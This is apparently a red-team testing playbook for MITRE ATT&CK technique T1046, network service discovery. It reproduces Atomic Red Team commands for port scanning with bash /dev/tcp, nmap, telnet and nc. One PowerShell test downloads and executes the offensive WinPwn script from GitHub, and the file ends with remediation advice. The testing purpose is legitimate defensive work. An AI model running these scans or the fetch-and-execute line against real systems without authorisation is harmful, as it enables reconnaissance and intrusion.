---
name: "T1046_network-service-discovery"
description: "Adversaries may attempt to get a listing of services running on remote hosts and local network infrastructure devices, including those that may be vulnerable to remote software exploitation."
category: "information-gathering"
version: "18.1"
author: "cyberstrike-official"
tags:
  - mitre-attack
  - enterprise
  - t1046
  - discovery
  - containers
  - iaas
  - linux
  - macos
  - network-devices
  - windows
technique_id: "T1046"
tactic: "discovery"
all_tactics:
  - discovery
platforms:
  - Containers
  - IaaS
  - Linux
  - macOS
  - Network Devices
  - Windows
mitre_url: "https://attack.mitre.org/techniques/T1046"
tech_stack:
  - containers
  - cloud
  - linux
  - macos
  - network devices
  - windows
cwe_ids:
  - CWE-200
chains_with:
  []
prerequisites:
  []
severity_boost: {}
---

# T1046 Network Service Discovery

## High-Level Description

Adversaries may attempt to get a listing of services running on remote hosts and local network infrastructure devices, including those that may be vulnerable to remote software exploitation. Common methods to acquire this information include port, vulnerability, and/or wordlist scans using tools that are brought onto a system. 

Within cloud environments, adversaries may attempt to discover services running on other cloud hosts. Additionally, if the cloud environment is connected to a on-premises environment, adversaries may be able to identify services running on non-cloud systems as well.

Within macOS environments, adversaries may use the native Bonjour application to discover services running on other macOS hosts within a network. The Bonjour mDNSResponder daemon automatically registers and advertises a host’s registered services on the network. For example, adversaries can use a mDNS query (such as <code>dns-sd -B _ssh._tcp .</code>) to find other systems broadcasting the ssh service.

## Kill Chain Phase

- Discovery (TA0007)

**Platforms:** Containers, IaaS, Linux, macOS, Network Devices, Windows

## What to Check

- [ ] Identify if Network Service Discovery technique is applicable to target environment
- [ ] Check Containers systems for indicators of Network Service Discovery
- [ ] Check IaaS systems for indicators of Network Service Discovery
- [ ] Check Linux systems for indicators of Network Service Discovery
- [ ] Verify mitigations are bypassed or absent (3 known mitigations)
- [ ] Assess detection coverage (1 detection strategies)

## How to Test

### Atomic Red Team Tests

The following tests are from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) and provide actionable ways to test this technique:

### Atomic Test 1: Port Scan

Scan ports to check for listening ports.

Upon successful execution, sh will perform a network connection against a single host (192.168.1.1) and determine what ports are open in the range of 1-65535. Results will be via stdout.

**Supported Platforms:** linux, macos

```bash
for port in {1..65535}; do (2>/dev/null echo >/dev/tcp/#{host}/$port) && echo port $port is open ; done
```

### Atomic Test 2: Port Scan Nmap

Scan ports to check for listening ports with Nmap.
Upon successful execution, sh will utilize nmap, telnet, and nc to contact a single or range of addresses on port 80 to determine if listening. Results will be via stdout.

**Supported Platforms:** linux, macos
**Elevation Required:** Yes

```bash
sudo nmap -sS #{network_range} -p #{port}
telnet #{host} #{port}
nc -nv #{host} #{port}
```

**Dependencies:**
- Check if nmap command exists on the machine
- Check if nc command exists on the machine
- Check if telnet command exists on the machine

### Atomic Test 3: Port Scan NMap for Windows

Scan ports to check for listening ports for the local host 127.0.0.1

**Supported Platforms:** windows
**Elevation Required:** Yes

```powershell
nmap #{host_to_scan}
```

**Dependencies:**
- NMap must be installed

### Atomic Test 4: Port Scan using python

Scan ports to check for listening ports with python

**Supported Platforms:** windows

```powershell
python "#{filename}" -i #{host_ip}
```

**Dependencies:**
- Check if python exists on the machine

### Atomic Test 5: WinPwn - spoolvulnscan

Start MS-RPRN RPC Service Scan using spoolvulnscan function of WinPwn

**Supported Platforms:** windows

```powershell
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
spoolvulnscan -noninteractive -consoleoutput
```


### Manual Testing

If Atomic Red Team tests are not applicable, manually verify the technique by:

1. **Identify Attack Surface**: Determine if the target environment is susceptible to Network Service Discovery by examining the target platforms (Containers, IaaS, Linux).

2. **Assess Existing Defenses**: Review whether mitigations for T1046 are in place. If defenses are absent or misconfigured, this technique may be exploitable.

3. **Execute Test**: Use tools and methods described in the MITRE ATT&CK page and external references below.

## Remediation Guide

### M1042 Disable or Remove Feature or Program
Ensure that unnecessary ports and services are closed to prevent risk of discovery and potential exploitation.

### M1031 Network Intrusion Prevention
Use network intrusion detection/prevention systems to detect and prevent remote service scans.

### M1030 Network Segmentation
Ensure proper network segmentation is followed to protect critical servers and devices.


## Detection

### Behavioral Detection Strategy for Network Service Discovery Across Platforms


## Risk Assessment

| Finding | Severity | Impact |
| ------- | -------- | ------ |
| Network Service Discovery technique applicable | High | Discovery |

## CWE Categories

| CWE ID | Title |
| ------ | ----- |
| CWE-200 | Exposure of Sensitive Information |


## References

- [apple doco bonjour description](https://developer.apple.com/library/archive/documentation/Cocoa/Conceptual/NetServices/Introduction.html)
- [CISA AR21-126A FIVEHANDS May 2021](https://us-cert.cisa.gov/ncas/analysis-reports/ar21-126a)
- [macOS APT Activity Bradley](https://themittenmac.com/what-does-apt-activity-look-like-on-macos/)
- [Atomic Red Team - T1046](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1046)
- [MITRE ATT&CK - T1046](https://attack.mitre.org/techniques/T1046)
